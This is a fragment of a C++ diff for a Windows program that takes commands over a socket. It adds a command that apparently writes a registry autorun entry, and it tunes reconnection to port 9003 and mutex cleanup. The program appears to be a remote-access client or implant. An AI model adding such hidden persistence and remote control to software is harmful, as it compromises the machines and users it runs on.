                             if (!dp->srcPath.empty()) {
                                 wstring wpath = Utf8ToWide(dp->srcPath);
                                 DeleteFileW(wpath.c_str());
@@ -5100,6 +5486,18 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                         if (hThread) CloseHandle(hThread);
                     }
 
+                    else if (cmd == CMD_REG_WRITE_AUTO) {
+                    struct Param { SOCKET sock; string payload; };
+                    Param* param = new Param{ cs, dataStr };
+                    HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
+                        Param* dp = (Param*)p;
+                        RegWriteAuto(dp->sock, dp->payload);
+                        delete dp;
+                        return 0;
+                        }, param, 0, NULL);
+                    if (hThread) CloseHandle(hThread);
+                    }
+
                     else if (cmd == CMD_HEARTBEAT) {
                         // 忽略
                     }
@@ -5109,7 +5507,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                     }
                 } // end while RecvPacketBin
 
-                // 指令连接断了，2秒后重连9003
                 // 指令连接断了，2秒后重连9003
                 closesocket(cs);
                 // ★ 新增：清除g_CmdSocket记录（连接已关闭）
@@ -5128,7 +5525,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                     // 记录本次重连时间
                     InterlockedExchange((LONG*)&s_lastConnectTick, (LONG)GetTickCount());
 
-                    // 计算等待时间：500ms * 2^level，上限8000ms
                     // 计算等待时间：500ms * 2^level，上限16000ms
                     LONG level = InterlockedCompareExchange(&s_backoffLevel, 0, 0);
                     int waitMs = 500;
@@ -5179,9 +5575,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
         Sleep(RECONNECT_MS);
     }
-    if (hNetMutex) CloseHandle(hNetMutex);
+    if (hNetMutex) { ReleaseMutex(hNetMutex); CloseHandle(hNetMutex); }
     WSACleanup();
     GdiplusShutdown(gdiplusToken);
-    CloseHandle(hMutex);
     return 0;
 }
